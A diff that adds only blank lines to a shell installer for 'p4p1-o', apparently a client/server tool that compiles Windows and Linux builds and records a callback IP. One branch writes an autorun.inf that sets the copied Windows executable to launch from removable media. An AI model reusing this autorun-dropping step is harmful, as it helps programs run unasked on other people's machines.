@@ -13,6 +13,7 @@
 # ./p4p1-o_UserGuide
 
 function Remove {
+
 	REMOVED_ALL=0
 	VER=`cat ~/.p4p1-o/cfg/ver.cfg`
 
@@ -21,6 +22,7 @@ function Remove {
 
 	rm -rf ~/.p4p1-o/
 	exit $REMOVED_ALL
+
 }
 
 E_NOINSTALL=40
@@ -86,8 +88,10 @@ elif [ "$1" = "-d" ];then
 elif [ ! -d "$HOME_PATH" ]; then
 
 	if [ ! -e "Makefile" ]; then
+
 		echo "[!] Error no makefile found!"
 		exit $E_MAKE
+
 	fi
 
 	echo "[*] Please enter  p4p1 version"
@@ -96,6 +100,7 @@ elif [ ! -d "$HOME_PATH" ]; then
 	make windows
 
 	if [ "$?" = "2" ]; then
+
 		echo "[!] Please download mingw"
 		echo "[*] The program will compile the linux client and server version $VERSION"
 		echo "[*] Press enter to continue"
@@ -104,7 +109,9 @@ elif [ ! -d "$HOME_PATH" ]; then
 
 		mv -v $MAKENAMELC p4p1-o_V$VERSION
 		mv -v $MAKENAMELS p4p1-s_V$VERSION
+
 	else
+
 		mv -v $MAKENAMEW32C p4p1-o_32_V$VERSION.exe
 		mv -v $MAKENAMEW64C p4p1-o_64_V$VERSION.exe
 		echo "[*] Making p4p1 version $VERSION for linux"
@@ -112,6 +119,7 @@ elif [ ! -d "$HOME_PATH" ]; then
 
 		mv -v $MAKENAMELC p4p1-o_V$VERSION
 		mv -v $MAKENAMELS p4p1-s_V$VERSION
+
 	fi
 
 	echo "[*] Compiled all of the p4p1-o and p4p1-s files."
@@ -127,8 +135,10 @@ elif [ ! -d "$HOME_PATH" ]; then
 	read q
 
 	if [ "$q" = "no" ]; then
+
 		rm -rf ~/.p4p1-o/
 		exit E_NOINSTALL
+
 	fi
 
 	echo "[*] Create paths"
@@ -170,12 +180,16 @@ elif [ ! -d "$HOME_PATH" ]; then
 	read q
 
 	if [ "$q"  = "no" ]; then
+
 		echo "[*] Enter custom ip"
 		read CUSTOM_IP
 		echo $CUSTOM_IP > $IP_FILE
+
 	else
+
 		echo "[*] Writing ip to file"
 		echo $EXT_IP > $IP_FILE
+
 	fi
 
 	mv p4p1-s_V$VERSION $HOME_PATH
@@ -204,6 +218,7 @@ else
 		echo "[*] Done."
 
 	else
+
 		UN=`cat ~/.p4p1-o/cfg/un.cfg`
 
 		echo "[*] Hy $UN."
@@ -231,11 +246,15 @@ else
 			echo "[autorun]" > $AUTORUN
 
 			if [ "$q" = "32" ];then
+
 				cp -v $W32EXE_PATH .
 				echo "open=$W32EXE" >> $AUTORUN
+
 			else
+
 				cp -v $W64EXE_PATH .
 				echo "open=$W64EXE" >> $AUTORUN
+
 			fi
 
 			echo "action=Start ShellRun-CD" >> $AUTORUN
@@ -270,6 +289,9 @@ else
 			exit $E_NOCHOICE
 
 		fi
+
 	fi
+
 fi
+
 exit
